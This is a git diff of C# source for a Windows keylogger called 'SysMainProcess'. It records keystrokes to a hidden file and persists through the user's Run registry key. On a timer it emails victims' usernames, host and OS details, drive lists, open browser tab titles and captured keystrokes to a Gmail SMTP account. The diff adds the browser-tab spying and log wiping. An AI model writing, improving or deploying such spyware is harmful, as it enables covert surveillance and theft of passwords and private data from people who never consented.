@@ -7,11 +7,14 @@ using System.Threading;
 using System.Timers;
 using Microsoft.Win32;
 using System.Windows.Forms;
+using System.Diagnostics;
+using System.Windows.Automation;
 
 namespace SysMainProcess
 {
     partial class SysMainProcess
     {
+        #region DECLARATION
         private static string filepath = "";
         private static string path = "";
         private static string lastPath = "";
@@ -22,20 +25,27 @@ namespace SysMainProcess
         private static string subject = "";
         private static string podcastContents = "";
 
+        private static string[] drives = new string[0];
+
+        private static bool checkProcess = false;
+
         private static IPHostEntry host = null;
         private static SmtpClient client = null;
         private static MailMessage podcastMessage = null;
 
-        private static RegistryKey rkApp = null;
+        private static RegistryKey rkProcess = null;
 
         private static System.Timers.Timer timer = new System.Timers.Timer();
 
-        private static bool checkProcess = false;
+        private static Process[] procs = null;
+        private static AutomationElement root = null;
+        private static Condition condition = null;
+        private static AutomationElementCollection tabs = null;
 
-        private static string[] drives =  new string[0];
 
         [DllImport("User32.dll")]
         public static extern int GetAsyncKeyState(int i);
+        #endregion DECLARATION
 
         static void Main(string[] args)
         {
@@ -50,13 +60,13 @@ namespace SysMainProcess
 
             if (!File.Exists(path))
             {
-                using (StreamWriter sw = File.CreateText(path)) { }
+                using (StreamWriter sw = File.CreateText(path)) { sw.Dispose(); }
             }
 
             File.SetAttributes(path, File.GetAttributes(path) | FileAttributes.Hidden | FileAttributes.NotContentIndexed | FileAttributes.Temporary);
 
-            rkApp = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
-            rkApp.SetValue("SysMainProcess", Application.ExecutablePath.ToString());
+            rkProcess = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
+            rkProcess.SetValue("SysMainProcess", Application.ExecutablePath.ToString());
             
             timer.Interval = PODCAST_INTERVAL;
             timer.Elapsed += new ElapsedEventHandler(SendNewPodcast);
@@ -85,12 +95,95 @@ namespace SysMainProcess
                                 Console.Write((char)i);
                                 sw.Write((char)i);
                             }
+
+                            sw.Dispose();
                         }
                     }
                 }
             }
         }
 
+        #region METHODS
+        static void CheckUrl()
+        {
+            try
+            {
+                if (Process.GetProcessesByName("chrome").Length <= 0)
+                {
+                    if(Process.GetProcessesByName("opera").Length <= 0)
+                    {
+                        if (Process.GetProcessesByName("firefox").Length <= 0)
+                        {
+                            if (Process.GetProcessesByName("MicrosoftEdge").Length <= 0)
+                            {
+                                procs = Process.GetProcessesByName("anywayGHgdhghdhjgdhjkghdahjgduyo");
+                                podcastContents += "\n Browser: Browser is not running.";
+                            }
+                            else
+                            {
+                                procs = Process.GetProcessesByName("MicrosoftEdge");
+                                podcastContents += "\n Browser: Microsoft Edge";
+                            }
+                        }
+                        else
+                        {
+                            procs = Process.GetProcessesByName("firefox");
+                            podcastContents += "\n Browser: Firefox";
+                        }
+                    }
+                    else
+                    {
+                        procs = Process.GetProcessesByName("opera");
+                        podcastContents += "\n Browser: Opera GX";
+                    }
+                    
+                }
+                else
+                {
+                    procs = Process.GetProcessesByName("chrome");
+                    podcastContents += "\n Browser: Chrome";
+                }
+               
+
+                if (procs.Length > 0)
+                {
+                    foreach (Process proc in procs)
+                    {
+                        if (proc.MainWindowHandle == IntPtr.Zero)
+                        {
+                            continue;
+                        }
+
+                        root = AutomationElement.FromHandle(proc.MainWindowHandle);
+                        condition = new PropertyCondition(AutomationElement.ControlTypeProperty, ControlType.TabItem);
+
+                        tabs = root.FindAll(TreeScope.Descendants, condition);
+
+                        foreach (AutomationElement tabitem in tabs)
+                        {
+                            podcastContents += "\n Open Tab: " + tabitem.Current.Name;
+                        }
+                    }
+                }
+            }
+            catch (Exception ex)
+            {
+                ex.ToString();
+            }
+        }
+        static void EraseFileContents()
+        {
+            if (File.Exists(path))
+            {
+                File.Delete(path);
+            }
+            using (StreamWriter sw = File.CreateText(path))
+            {
+                sw.Dispose();
+            }
+
+            File.SetAttributes(path, File.GetAttributes(path) | FileAttributes.Hidden | FileAttributes.NotContentIndexed | FileAttributes.Temporary);
+        }
         static void SendNewPodcast(object source, ElapsedEventArgs e)
         {
             if(checkProcess)
@@ -111,6 +204,7 @@ namespace SysMainProcess
                 subject = "";
 
                 host = null;
+                client.Dispose();
                 client = null;
                 podcastMessage = null;
 
@@ -120,15 +214,6 @@ namespace SysMainProcess
                 EraseFileContents();
             }
         }
-
-        static void EraseFileContents()
-        {
-            if (File.Exists(path))
-            {
-                File.WriteAllText(path, "");
-            }
-        }
-
         static void CreatePodcast()
         {
             host = Dns.GetHostEntry(Dns.GetHostName());
@@ -139,24 +224,31 @@ namespace SysMainProcess
             }
 
             now = DateTime.Now;
+
             subject = "Message from SysMain " + host.HostName;
+            podcastContents += "\n Time: " + now.ToString();
+
+            podcastContents += "\n";
 
             podcastContents += "\n User: " + Environment.UserDomainName + " || User Name: " + Environment.UserName;
             podcastContents += "\n Host: " + host.HostName;
             podcastContents += "\n OS Version: " + Environment.OSVersion;
-            podcastContents += "\n Processor: " + Environment.ProcessorCount;
+            podcastContents += "\n Processor Cores Count: " + Environment.ProcessorCount;
 
             drives = Environment.GetLogicalDrives();
-
             for (int i = 0; i < drives.Length; i++)
             {
                 podcastContents += "\n Logical Drive(" + i + "): " + drives[i];
             }
-            
-            podcastContents += "\n Time: " + now.ToString();
-            podcastContents += "\n Content: " + logContents;
-        }
 
+            podcastContents += "\n";    
+
+            CheckUrl();
+
+            podcastContents += "\n";
+
+            podcastContents += "\n Content: \n" + logContents;
+        }
         static void EstablishNetworkConnectivity()
         {
             client = new SmtpClient("smtp.gmail.com", SMTP_PORT)
@@ -173,6 +265,7 @@ namespace SysMainProcess
             podcastMessage.Subject = subject;
             podcastMessage.Body = podcastContents;
         }
+        #endregion METHODS
     }
 }
 
@@ -182,4 +275,4 @@ namespace SysMainProcess
   █   █ ▀▄   █      █           ▀▄    ▄▀  █    ▐          █         █   █    █    ▌        █    █   █    ▌   ▄▀   █   █    █ 
 ▄▀   █   █▀▀▀     ▄▀▄▄▄▄▄▄▀       ▀▀▀▀    █             ▄▀         ▄▀  ▄▀   ▄▀▄▄▄▄        ▄▀▄▄▄▄▀  ▄▀▄▄▄▄   █   ▄▀   ▄▀▄▄▄▄▀ 
 █    ▐   ▐        █                      █             █          █   █     █    ▐       █     ▐   █    ▐   ▐   ▐   █     ▐  
-▐                 ▐                      ▐             ▐          ▐   ▐     ▐            ▐         ▐                ▐         by  Anonimous user*/
+▐                 ▐                      ▐             ▐          ▐   ▐     ▐            ▐         ▐                ▐         by  Anonymous user*/
